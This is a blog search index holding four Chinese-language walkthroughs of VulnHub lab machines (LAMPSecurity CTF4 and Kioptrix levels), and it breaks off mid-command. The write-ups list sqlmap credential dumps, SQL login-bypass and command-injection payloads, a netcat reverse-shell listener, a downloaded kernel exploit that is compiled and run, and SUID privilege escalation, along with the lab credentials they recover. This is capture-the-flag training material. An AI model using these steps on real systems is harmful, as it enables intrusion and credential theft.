<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1-破解-LAMPSecurity：CTF4（CTF-挑战）</title>
      <link href="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/"/>
      <url>/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="破解-LAMPSecurity：CTF4（CTF-挑战）"><a href="#破解-LAMPSecurity：CTF4（CTF-挑战）" class="headerlink" title="破解 LAMPSecurity：CTF4（CTF 挑战）"></a>破解 LAMPSecurity：CTF4（CTF 挑战）</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/lampsecurity-ctf4,83/">https://www.vulnhub.com/entry/lampsecurity-ctf4,83/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.<strong>渗透方法</strong></h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>冲浪HTTP服务端口（80）</li><li>SQLMAP 扫描</li><li>提取数据库和用户凭据</li><li>通过 SSH 登录到目标机器</li><li>使用 SUDO 二进制文件利用目标</li><li>获取 Root 权限</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><ul><li>使用 netdiscover -i eth0 -r 192.168.1.0&#x2F;24  发现目标主机</li></ul><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604105028148.png" alt="image-20220604105028148"></p><ul><li><p>使用nmap扫描目标主机，判断主机类型信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.6</span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604105702544.png" alt="image-20220604105702544"></p><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604105852540.png" alt="image-20220604105852540"></p><p>我们发现目标主机打开80（http）、25（SMTP）、22（SSH）端口</p></li><li><p>因为80端口是web端口一般存在网站，这里我们直接使用浏览器直接进行访问</p><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604110300674.png" alt="image-20220604110300674"></p><p>这里我们发现网站欢迎页</p></li><li><p>这里我们要明确一个思路，首先拿到一个网站，搜先寻找地址栏是否存在get型sql注入点</p></li><li><p>在博客选项卡，进一步枚举，我们发现URL参数id容易存在error类型sql注入</p><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604110848877.png" alt="image-20220604110848877"></p><p>发现注入点就好办了，直接使用sqlmap进行枚举跑就行了，用以获取更多信息</p></li><li><p>使用sqlmap进行数据获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.6/index.html?page=blog&amp;title=Blog&amp;id=2 --dbs --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604130324095.png" alt="image-20220604130324095"></p></li><li><p>成功完成 SQLMAP 扫描后，我们得到了所有数据库的列表！！现在我们尝试使用<strong>ehks</strong>数据库，使用以下命令提取其他详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.6/index.html?page=blog&amp;title=Blog&amp;id=2&quot; -D ehks --tables --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604130824725.png" alt="image-20220604130824725"></p></li><li><p>在收到所有数据库的表后，我们选择了ehks 数据库的<strong>用户</strong>表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.6/index.html?page=blog&amp;title=Blog&amp;id=2&quot; -D ehks -t user --dump </span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604131408625.png" alt="image-20220604131408625"></p></li></ul><blockquote><pre><code>            从上面的截图中可以看出，我们得到了 ehks 数据库用户表的所有用户及其对应凭证的列表</code></pre></blockquote><ul><li><p>让我们进一步尝试通过 SSH 访问用户<strong>dstevens</strong>及其密码（如上所示）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh dstevens@192.168.1.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ssh/ssh_config</span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604132257503.png" alt="image-20220604132257503"></p><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604132447398.png" alt="image-20220604132447398"></p></li><li><p>还得将得到的密钥进行md5解密</p><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604132955389.png" alt="image-20220604132955389"></p><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604133238463.png" alt="image-20220604133238463"></p><p>已经登陆成功了</p></li><li><p>所以我们得到了普通用户，这是我们的第一个成功。现在让我们进行进一步的枚举并尝试提升权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604133519076.png" alt="image-20220604133519076"></p></li><li><p>在执行 sudo -l 时，我们观察到用户<strong>dstevens</strong>没有设置任何限制，并且有权使用 sudo 运行所有命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p><img src="/2022/06/19/1-%E7%A0%B4%E8%A7%A3-LAMPSecurity%EF%BC%9ACTF4%EF%BC%88CTF-%E6%8C%91%E6%88%98%EF%BC%89/image-20220604133619479.png" alt="image-20220604133619479"></p></li><li><p>结束，我们获得了root权限</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge)</title>
      <link href="/2022/06/19/11.Hack%20The%20Kioptrix%20Level-1.1%20(Boot2Root%20Challenge)/"/>
      <url>/2022/06/19/11.Hack%20The%20Kioptrix%20Level-1.1%20(Boot2Root%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Kioptrix-Level-1-1-Boot2Root-Challenge"><a href="#Hack-The-Kioptrix-Level-1-1-Boot2Root-Challenge" class="headerlink" title="Hack The Kioptrix Level-1.1 (Boot2Root Challenge)"></a>Hack The Kioptrix Level-1.1 (Boot2Root Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1">https://www.vulnhub.com/entry/kioptrix-level-1-1</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>冲浪HTTP服务端口（80）</li><li>SQLMAP 扫描</li><li>提取数据库和用户凭据</li><li>使用特定用户对目标进行 SSH 访问</li><li>使用 SUID 位和 SUDO 二进制文件利用目标</li><li>获取 Root 访问权限并捕获标志。</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1局域网寻找目标靶机"><a href="#2-1局域网寻找目标靶机" class="headerlink" title="2.1局域网寻找目标靶机"></a>2.1局域网寻找目标靶机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.154.0/24</span><br></pre></td></tr></table></figure><p>![image-20220608114438610](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608114438610.png)</p><h3 id="2-2-nmap扫描目标主机端口和服务"><a href="#2-2-nmap扫描目标主机端口和服务" class="headerlink" title="2.2 nmap扫描目标主机端口和服务"></a>2.2 nmap扫描目标主机端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namp -A 192.168.154.237</span><br><span class="line">nmap -Pn -sV 192.168.154.237</span><br></pre></td></tr></table></figure><blockquote><p>目标主机存在端口和服务</p></blockquote><p>![image-20220608114737685](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608114737685.png)</p><blockquote><p>开放端口 22,80,111,443,631,3306</p></blockquote><blockquote><p>由于80端口开放先测试网站</p></blockquote><h3 id="2-3-测试http服务"><a href="#2-3-测试http服务" class="headerlink" title="2.3 测试http服务"></a>2.3 测试http服务</h3><ol><li><p>在不浪费时间的情况下，我们尝试按照给定的形式进行<strong>SQL 注入</strong></p><p>![image-20220608115042870](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608115042870.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用常规测试语句</span><br><span class="line">Username: 1&#x27; or &#x27;1&#x27;</span><br><span class="line">Password: 1&#x27; or &#x27;1&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>猜对了，果然存在注入点</p></blockquote><p>![image-20220608115252973](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608115252973.png)</p><blockquote><p>我们成功登录到基本管理 Web 控制台，在那里我们找到了一个用于用户输入的空文本字段。每当我看到这种类型的场景时，我都会尝试针对命令注入漏洞对其进行测试。</p></blockquote><blockquote><p>提交 ;id 命令枚举出当前登录的用户的UID和GID</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;id</span><br></pre></td></tr></table></figure><p>![image-20220608115640604](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608115640604.png)</p><blockquote><p>这也成功了说明这个应用程序是容易受到sql注入攻击的</p></blockquote></li></ol><h3 id="2-5-生成反弹shell连接"><a href="#2-5-生成反弹shell连接" class="headerlink" title="2.5 生成反弹shell连接"></a>2.5 生成反弹shell连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p>![image-20220608120527355](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608120527355.png)</p><p>![image-20220608120629243](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608120629243.png)</p><blockquote><p>kali是109  端口配置是8888</p></blockquote><p>![image-20220608125327672](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608125327672.png)</p><h3 id="2-6-提权"><a href="#2-6-提权" class="headerlink" title="2.6 提权"></a>2.6 提权</h3><blockquote><p>在谷歌的帮助下，我们寻找它的 Kernel exploit 来提升权限，幸运的是“Linux kernel 2.6 &lt; 2.6.19 (32bit) ip_append_data() local ring0 root exploit”因此我们可以使用<strong>9542exploi</strong> t 来提升权限</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/9542 --no-check-certificate</span><br><span class="line">mv 9542 shell.c</span><br></pre></td></tr></table></figure><p>![image-20220608130229344](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608130229344.png)</p><p>![image-20220608130317651](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608130317651-16546645983901.png)</p><blockquote><p>编译shell.c 然后运行提权</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc shell.c</span><br><span class="line">./a.out</span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>![image-20220608130554980](11.Hack The Kioptrix Level-1.1 (Boot2Root Challenge).assets&#x2F;image-20220608130554980.png)</p><h2 id="3-拿到root权限，挑战结束"><a href="#3-拿到root权限，挑战结束" class="headerlink" title="3.拿到root权限，挑战结束"></a>3.拿到root权限，挑战结束</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge)</title>
      <link href="/2022/06/19/13.Hack%20The%20Kioptrix%20Level-1.3%20(Boot2Root%20Challenge)/"/>
      <url>/2022/06/19/13.Hack%20The%20Kioptrix%20Level-1.3%20(Boot2Root%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Kioptrix-Level-1-3-Boot2Root-Challenge"><a href="#Hack-The-Kioptrix-Level-1-3-Boot2Root-Challenge" class="headerlink" title="Hack The Kioptrix Level-1.3 (Boot2Root Challenge)"></a>Hack The Kioptrix Level-1.3 (Boot2Root Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（netdiscover、Nmap）</li><li>目录遍历（dirb）</li><li>登录表格 SQli</li><li>生成 tty 外壳</li><li>SUID 权限提升</li><li>获取 root 访问权限并捕获标志</li></ul><h2 id="2-渗流流程"><a href="#2-渗流流程" class="headerlink" title="2.渗流流程"></a>2.渗流流程</h2><h3 id="2-1局域网寻找目标主机ip"><a href="#2-1局域网寻找目标主机ip" class="headerlink" title="2.1局域网寻找目标主机ip"></a>2.1局域网寻找目标主机ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.111.0/24</span><br></pre></td></tr></table></figure><p>![image-20220608154455947](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608154455947.png)</p><blockquote><p>目标ip 192.168.111.158</p></blockquote><h3 id="2-2-nmap扫描目标主机"><a href="#2-2-nmap扫描目标主机" class="headerlink" title="2.2 nmap扫描目标主机"></a>2.2 nmap扫描目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.111.158</span><br><span class="line">nmap -Pn -sV 192.168.111.158</span><br></pre></td></tr></table></figure><p>![image-20220608154743267](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608154743267.png)</p><p>![image-20220608154836817](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608154836817.png)</p><blockquote><p>开放端口： 22,80,139,445</p></blockquote><h3 id="2-3dirb目录爆破"><a href="#2-3dirb目录爆破" class="headerlink" title="2.3dirb目录爆破"></a>2.3dirb目录爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.111.158:80</span><br></pre></td></tr></table></figure><blockquote><p>一个是图片的目录，另外一个好像是用户的</p></blockquote><p>![image-20220608155131653](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608155131653.png)</p><blockquote><p>访问john目录，并没有发现有用的东西</p></blockquote><p>![image-20220608155336812](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608155336812.png)</p><blockquote><p>回到登录页寻找注入点</p></blockquote><p>![image-20220608155510996](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608155510996.png)</p><blockquote><p>找到注入点</p></blockquote><h3 id="2-4-sqlmap注入点注入"><a href="#2-4-sqlmap注入点注入" class="headerlink" title="2.4 sqlmap注入点注入"></a>2.4 sqlmap注入点注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.111.158/member.php?username=1 --dbs --batch</span><br></pre></td></tr></table></figure><blockquote><p>突然发现有户名有，密码直接使用 ‘ or 1&#x3D;1 # 进行绕过就可以了</p></blockquote><p>![image-20220608160224367](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608160224367.png)</p><blockquote><p>得到用户名密码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username : john</span><br><span class="line">Password : MyNameIsJohn</span><br></pre></td></tr></table></figure><h3 id="2-5-ssh尝试登录"><a href="#2-5-ssh尝试登录" class="headerlink" title="2.5 ssh尝试登录"></a>2.5 ssh尝试登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.111.158</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username : john</span><br><span class="line">Password : MyNameIsJohn</span><br></pre></td></tr></table></figure><p>![image-20220608160606527](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608160606527.png)</p><blockquote><p>到这一步拿到普通的bash执行权限，下一步提权</p></blockquote><h3 id="2-6提权"><a href="#2-6提权" class="headerlink" title="2.6提权"></a>2.6提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><blockquote><p>什么也没有</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&#x27;/bin/bash&#x27;)</span><br><span class="line">cd /var/www</span><br></pre></td></tr></table></figure><p>![image-20220608161031104](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608161031104.png)</p><blockquote><p>获得<em>checklogin.php</em>文件；打开它以进行进一步的步骤</p></blockquote><p>![image-20220608161235558](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608161235558.png)</p><blockquote><p>mysql 的root账户居然没有密码</p></blockquote><blockquote><p>尝试登录mysql的root账户</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure><blockquote><p>果然登录成功</p></blockquote><p>![image-20220608161445627](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608161445627.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">SELECT sys_exec(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">echo os.system(&#x27;/bin/bash&#x27;)</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>![image-20220608163932515](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608163932515.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch raj</span><br><span class="line">find raj -exec &quot;whoami&quot; \;</span><br><span class="line">find raj -exec &quot;/bin/sh&quot; \;</span><br><span class="line">ls</span><br><span class="line">cat congrats .txt</span><br></pre></td></tr></table></figure><p>![image-20220608164206782](13.Hack The Kioptrix Level-1.3 (Boot2Root Challenge).assets&#x2F;image-20220608164206782.png)</p><h2 id="3-拿到root权限，挑战结束"><a href="#3-拿到root权限，挑战结束" class="headerlink" title="3.拿到root权限，挑战结束"></a>3.拿到root权限，挑战结束</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge)</title>
      <link href="/2022/06/19/12.Hack%20the%20Kioptrix%20Level-1.2%20(Boot2Root%20Challenge)/"/>
      <url>/2022/06/19/12.Hack%20the%20Kioptrix%20Level-1.2%20(Boot2Root%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Kioptrix-Level-1-2-Boot2Root-Challenge"><a href="#Hack-the-Kioptrix-Level-1-2-Boot2Root-Challenge" class="headerlink" title="Hack the Kioptrix Level-1.2 (Boot2Root Challenge)"></a>Hack the Kioptrix Level-1.2 (Boot2Root Challenge)</h1><blockquote><p>镜像地址：<a href="https://download.vulnhub.com/kioptrix/KVM3.rar">https://download.vulnhub.com/kioptrix/KVM3.rar</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>冲浪HTTP服务端口（80）</li><li>SQLMAP 扫描</li><li>提取数据库和用户凭据</li><li>使用特定用户对目标进行 SSH 访问</li><li>使用 SUID 位和 SUDO 二进制文件利用目标</li><li>获取 Root 访问权限并捕获标志。</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1局域网寻找目标主机"><a href="#2-1局域网寻找目标主机" class="headerlink" title="2.1局域网寻找目标主机"></a>2.1局域网寻找目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.111.0/24</span><br></pre></td></tr></table></figure><p>![image-20220608131958049](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608131958049.png)</p><blockquote><p>主机ip     192.168.111.186</p></blockquote><h3 id="2-2nmap扫描目标主机端口和服务"><a href="#2-2nmap扫描目标主机端口和服务" class="headerlink" title="2.2nmap扫描目标主机端口和服务"></a>2.2nmap扫描目标主机端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.111.186</span><br><span class="line">nmap -Pn -sV 192.168.111.186</span><br></pre></td></tr></table></figure><p>![image-20220608132250758](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608132250758.png)</p><p>![image-20220608132339814](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608132339814.png)</p><h3 id="2-3-测试http服务"><a href="#2-3-测试http服务" class="headerlink" title="2.3 测试http服务"></a>2.3 测试http服务</h3><blockquote><p>浏览器访问 <a href="http://192.168.111.186/">http://192.168.111.186:80</a></p></blockquote><p>![image-20220608132523627](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608132523627.png)</p><blockquote><p>发现目标站点</p></blockquote><p>![image-20220608133651828](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608133651828.png)</p><blockquote><p>由于是靶机环境这里需要在kali的hosts文件添加url </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/hosts</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.186  kioptrix3.com</span><br></pre></td></tr></table></figure><p>![image-20220608134231701](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608134231701.png)</p><blockquote><p>发现注入点</p></blockquote><p>![image-20220608134753864](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608134753864.png)</p><p>![image-20220608134909894](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608134909894.png)</p><h3 id="2-4-sqlmap进行注入点测试"><a href="#2-4-sqlmap进行注入点测试" class="headerlink" title="2.4 sqlmap进行注入点测试"></a>2.4 sqlmap进行注入点测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><blockquote><p>发现数据库</p></blockquote><p>![image-20220608135042244](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608135042244.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery --tables --batch</span><br></pre></td></tr></table></figure><blockquote><p>发现数据表</p></blockquote><p>![image-20220608135205178](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608135205178.png)</p><blockquote><p>爆破用户</p></blockquote><p>![image-20220608135259245](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608135259245.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery -T gallarific_users --dump --batch</span><br></pre></td></tr></table></figure><blockquote><p>爆出的用户信息</p></blockquote><p>![image-20220608135530914](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608135530914.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line">password : n0t7t1k4</span><br></pre></td></tr></table></figure><blockquote><p>以上是管理系统的信息</p></blockquote><blockquote><p>爆破系统信息</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery -T dev_accounts --dump --batch</span><br></pre></td></tr></table></figure><p>![image-20220608135841006](12.Hack the Kioptrix Level-1.2 (Boot2Root Challenge).assets&#x2F;image-20220608135841006.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------------------------------------+------------+</span><br><span class="line">| id | password                                    | username   |</span><br><span class="line">+----+---------------------------------------------+------------+</span><br><span class="line">| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |</span><br><span class="line">| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |</span><br><span class="line">+----+---------------------------------------------+------------+</span><br></pre></td></tr></table></figure><h3 id="2-5-ssh尝试登录"><a href="#2-5-ssh尝试登录" class="headerlink" title="2.5 ssh尝试登录"></a>2.5 ssh尝试登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 